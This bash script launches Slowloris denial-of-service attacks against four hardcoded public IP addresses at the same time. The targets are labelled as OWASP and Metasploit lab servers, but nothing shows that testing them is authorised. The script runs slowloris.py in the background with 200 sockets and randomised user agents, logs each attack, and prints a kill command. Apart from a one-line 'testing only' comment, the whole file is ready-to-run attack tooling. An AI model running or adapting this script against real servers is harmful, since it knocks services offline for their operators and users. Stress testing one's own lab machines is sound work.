#!/bin/bash
# Multi-target Slowloris tester (for TESTING PURPOSES ONLY)

# === Target Servers (Edit if needed) ===
OWASP_SERVER="41.203.208.129"
METASPLOIT_SERVER="197.248.128.1"
SAMPLE_SERVER="197.248.128.2"
SIMPLE_SAMPLE="41.203.208.130"

# === Slowloris Parameters ===
PORT=80
SOCKETS=200
SLEEPTIME=10
RAND_UA="--randuseragents"
USE_HTTPS=""  # set to "--https" if needed

# === Script Location ===
SCRIPT="./slowloris.py"  # Use the lightweight version

# === Log Directory ===
LOGDIR="./logs_slowloris"
mkdir -p "$LOGDIR"

# === Attack Function ===
attack_slowloris() {
    local TARGET_NAME="$1"
    local TARGET_IP="$2"
    local LOG_FILE="$LOGDIR/${TARGET_NAME}.log"

    echo "[*] Launching Slowloris attack on: $TARGET_NAME ($TARGET_IP)"
    python3 "$SCRIPT" "$TARGET_IP" -p "$PORT" -s "$SOCKETS" --sleeptime "$SLEEPTIME" $RAND_UA $USE_HTTPS > "$LOG_FILE" 2>&1 &
    echo "$!"
}

# === Start Attacks ===
PID1=$(attack_slowloris "owasp" "$OWASP_SERVER")
sleep 3

PID2=$(attack_slowloris "metasploit" "$METASPLOIT_SERVER")
sleep 3

PID3=$(attack_slowloris "sample" "$SAMPLE_SERVER")
sleep 3

PID4=$(attack_slowloris "simple" "$SIMPLE_SAMPLE")

# === Summary ===
echo
echo "[*] All Slowloris tests launched in background."
echo "[*] Monitor logs: tail -f $LOGDIR/*.log"
echo "[*] Stop all: kill $PID1 $PID2 $PID3 $PID4"
